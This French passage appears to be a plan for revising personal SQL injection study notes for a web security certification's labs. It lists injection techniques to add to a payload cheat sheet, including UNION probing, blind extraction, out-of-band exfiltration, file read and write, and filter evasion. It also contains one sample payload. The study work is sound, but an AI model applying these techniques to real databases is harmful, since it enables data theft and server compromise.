Constat : la section SQL injection de `04-Essential-skills/Payloads-cheatsheet.md` (lignes 117 à 163) couvre déjà : commentaire, `ORDER BY`, `NULL`, `FROM DUAL`, colonne de texte, concaténation, version, `information_schema`, `all_tables`, aveugle booléen (existence, longueur, caractère, dichotomie), erreurs conditionnelles et verbeuses par moteur, délais simples et conditionnels, hors bande (SQL Server, PostgreSQL, `UTL_INADDR`), réglages d'Intruder.

À ajouter (tous marqués "à vérifier" tant que non rejoués) :
1. Contexte numérique : `1 UNION SELECT NULL,NULL--` sans guillemet.
2. `UNION ALL SELECT NULL,NULL--`.
3. Agrégation de lignes : `GROUP_CONCAT` (MySQL), `STRING_AGG` (PostgreSQL, SQL Server 2017 et suivants), `LISTAGG` (Oracle). Seul `STRING_AGG` côté SQL Server figure déjà (ligne 152, dans un contexte d'erreur).
4. Parcours ligne par ligne : `LIMIT 1 OFFSET n` (PostgreSQL, MySQL), `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY` (SQL Server, Oracle 12c et suivants).
5. Utilisateur et base courants par moteur : `user()`, `database()` (MySQL), `current_user`, `current_database()` (PostgreSQL), `SYSTEM_USER`, `DB_NAME()` (SQL Server), `user` (Oracle). La cheat sheet donne seulement `SYSTEM_USER` en ligne 152.
6. Filtre de schéma PostgreSQL : `WHERE table_schema='public'`.
7. SQLite : `sqlite_version()`, `sqlite_master` pour l'énumération (la ligne 155 ne traite que l'erreur conditionnelle).
8. Vues Oracle du compte : `user_tables`, `user_tab_columns`.
9. Hors bande : exemple d'exfiltration Oracle (sous-requête dans le sous-domaine, ligne 160 ne donne que le principe), variante Oracle `EXTRACTVALUE(xmltype(...))`, MySQL `LOAD_FILE` sur Windows, exfiltration SQL Server avec variable.
10. Sensibilité à la casse MySQL : `BINARY SUBSTRING(...)` ; mention de la collation.
11. Délai sans fonction de pause (`BENCHMARK`), seulement comme repli.
12. Lecture et écriture de fichiers (`LOAD_FILE`, `INTO OUTFILE`, `pg_read_file`, `OPENROWSET`) avec les prérequis.
13. Contournements de filtre : casse, commentaires en ligne, double encodage, entités XML.
14. Équivalent de `LIMIT 1` par moteur dans une ligne unique (Oracle `ROWNUM=1`, SQL Server `TOP 1`, MySQL et PostgreSQL `LIMIT 1`).
15. Note de précaution déjà présente (ligne 162) : étendre à la lecture et écriture de fichiers.

Ne pas reporter (déjà présent) : la détection `'`, `ORDER BY`, `NULL`, `DUAL`, concaténation, version, énumération du schéma, l'aveugle booléen de base, les erreurs et les délais de base.

## 6. Plans de réécriture (structure et méthode générale uniquement)

### 6.1 SQL-injection.md
1. Frontmatter : tags sur une ligne (déjà), statut `en cours` conservé tant que le second ordre n'est pas étudié.
2. En bref : conserver, ajouter deux lignes sur l'impact concret (authentification, lecture, écriture, fichiers).
3. Contextes d'injection : nouveau tableau (chaîne, nombre, identifiant, ordre, limite).
4. Détection : procédure décidable (apostrophe, double apostrophe, arithmétique, booléen, délai, hors bande) avec critère de confirmation et renvoi vers Blind.
5. Exemples d'attaque : condenser les attaques 1 et 2 en un bloc de code annoté ; une seule mise en garde `OR 1=1`.
6. Points d'entrée : corps, JSON, XML, cookies, en-têtes, avec le placement dans Burp.
7. Variantes : tableau avec liens vers Union, Blind, Error-based ; second ordre annoncé.
8. Pièges BSCP : fusion des pièges communs (commentaire MySQL, encodage URL, cookie, session) ; ces pièges sont ensuite référencés par les autres notes.
9. Prévention : développer les limites des requêtes paramétrées (identifiants, ORM, procédures stockées) et la gestion des erreurs.
10. Labs : laisser les niveaux non faits inchangés ; pour les deux labs faits, remplacer l'énoncé recopié par un résumé et les observations personnelles.
11. Liens : ajouter Error-based, Blind ; retirer Access-control et Authentication si non justifiés.

### 6.2 Blind-SQL-injection.md
1. Frontmatter : tags sur une ligne ; statut cohérent avec les labs cochés réellement journalisés.
2. En bref : ajouter la définition d'oracle, de signal et de bruit.
3. Tableau des variantes : ajouter la colonne de renvoi vers Error-based pour les deux lignes d'erreur.
4. Supprimer les sections d'erreurs conditionnelles et verbeuses au profit de paragraphes courts avec renvoi (voir 2.2).
5. Garder en entier : réponses conditionnelles, extraction par caractère, dichotomie, délais, hors bande.
6. Détection : ajouter la mesure du bruit de base pour le temps de réponse.
7. Tableau par moteur : ajouter SQLite, `CHAR_LENGTH`, remarque de collation.
8. Pièges : ajouter JSON et XML, risque de verrouillage de compte, vérification du `+` dans un cookie (à tester puis consigner).
9. Retirer : remarques de rédaction (lignes 134, 158), gabarit de lab (lignes 182 à 194) ou le déplacer vers un modèle.
10. Labs : corriger la case de l'erreur verbeuse après confirmation de l'utilisateur ; pour les labs de délai et hors bande cochés sans journal, ne rien rédiger ; l'utilisateur ajoute ses journaux s'il le souhaite. Fixer le moteur du seul lab journalisé.
11. Liens : ajouter [[Error-based SQL Injection]].

### 6.3 SQL-injection-Union-Attacks.md
1. Frontmatter : statut `en cours`, tags sur une ligne.
2. Remplacer la case Apprentice (sans lab associé) et la case Practitioner globale par une case par lab, comme dans Blind.
3. En bref et variantes : conserver ; ajouter contexte numérique avec un exemple.
4. Détection : réduire à "résultats affichés ou non" avec renvoi vers SQL-injection.
5. Méthode : conserver `ORDER BY`, `NULL`, colonne de texte ; ajouter une courte section "extraire plusieurs lignes" (agrégation, `OFFSET`).
6. Syntaxe par moteur : un seul tableau maître regroupant commentaire, concaténation, version, énumération, avec SQLite et PostgreSQL (`table_schema`) ; supprimer les doublons des lignes 84, 85, 149, 206 à 208.
7. Pièges : conserver, ajouter la troncature par `LIMIT` et la colonne non affichée.
8. Prévention : remplacer par un renvoi et une ligne spécifique.
9. Journaux : résumer les énoncés, ajouter les observations personnelles pour les labs faits, ne rien ajouter pour les deux labs Oracle sans entrée.
10. Nettoyage de rédaction : lignes 37, 118, 138, 194.
11. Liens : retirer Access-control et Authentication si non justifiés ; ajouter SQL-injection, Blind, Error-based, Payloads-cheatsheet.

## 7. Éléments à confirmer par l'utilisateur
1. Le lab "Visible error-based SQL injection" est-il réalisé ? Blind dit oui, Error-based dit non.
2. Les labs de délai et hors bande sont-ils faits, vu la mention de la cheat sheet ("seul `TO_CHAR(1/0)` rejoué") ?
3. La case "Apprentice ✅ 2026-10-26" dans Union est-elle voulue ?
4. Les deux labs Oracle de la catégorie UNION sont-ils faits ? Aucune entrée dans la note, donc inchangé.
